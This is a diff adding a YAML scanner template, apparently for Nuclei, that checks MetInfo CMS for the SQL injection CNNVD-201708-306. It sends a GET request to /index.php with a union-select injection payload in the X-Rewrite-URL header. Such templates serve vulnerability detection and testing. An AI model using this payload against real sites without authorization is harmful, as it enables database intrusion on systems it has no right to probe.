@@ -1,0 +1,15 @@
+id: yaml-poc-metinfo-metinfo-sql_injection-CNNVD-201708-306
+info:
+  name: Yaml Poc Metinfo Metinfo Sql_Injection Cnnvd 201708 306
+  author: converted
+  severity: low
+  description: 'Converted from xpoc: yaml-poc-metinfo-metinfo-sql_injection-CNNVD-201708-306'
+  tags: sqli
+  reference: []
+http:
+- method: GET
+  path:
+  - /index.php?lang=Cn&index=1
+  headers:
+    X-Rewrite-URL: 1/2/404xxx' union select md5({{r1}}),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#/index.php
+  redirects: false
